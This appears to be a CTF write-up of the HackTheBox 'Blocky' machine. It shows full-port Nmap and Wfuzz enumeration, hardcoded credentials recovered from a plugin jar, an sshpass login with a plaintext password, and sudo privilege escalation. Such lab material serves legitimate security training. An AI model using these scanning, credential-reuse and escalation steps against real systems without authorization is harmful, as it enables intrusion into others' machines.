# Write Up

About Blocky machine:
- OS: Linux
- Difficulty: Easy
- Release date: 2017-Jul-21
- IP: 10.10.10.37

## Introduction 
The purpose of this report is to find the vulnerability to get access to the machine and do a privilege escalation.

## Tools
In this machine I use the following tools:
- Nmap
- Wfuzz
- Jdax-gui

## Steps
At first the machine is scanned. The results of the of the scan are the following:

```bash
nmap -sS -p- --min-rate 5000 --open -n -Pn -oG host 10.10.10.37
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-18 12:09 CET
Nmap scan report for 10.10.10.37
Host is up (0.048s latency).
Not shown: 65530 filtered tcp ports (no-response), 1 closed tcp port (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
25565/tcp open  minecraft

Nmap done: 1 IP address (1 host up) scanned in 39.76 seconds
```

The web page can't load because the web page don't solve DNS resolution. I need to solve it adding IP in /etc/hosts file.

At this point, I search the web to get any interesting paths or any information.

I only get user Notch and the web page is powered by Wordpress.

Now I fuzz the web to get hidden paths or files. As a result, I get many interesting paths.

```bash
wfuzz -t 400 --hc=404 -L -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://blocky.htb/FUZZ

```

Two archieves are found in the directory. The directory is called  _plugins_. I download the files and I inspect the files to get some information.

The credentials are writen in BlockyCore.jar. The credentials are read in the following picture.

![Desktop View](/assets/img/posts/Blocky/credentials.PNG)

I connect to the machine with SSH service because I find user and password.

```bash
sshpass -p '8YsqfCTnvxAUeduzjNSXe22' ssh notch@10.10.10.37
```

At this point, the user flag is dicovered.

Now, I verify my groups. 

```bash
notch@Blocky:~$ id
uid=1000(notch) gid=1000(notch) groups=1000(notch),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

The user notch is in the sudoers group. I have a valid password so I do a privilege escalation with password and get the root flag.

# Conclusion
To hack this machine you need knowledge of web discoverment, enumeration and reverse engeneering.
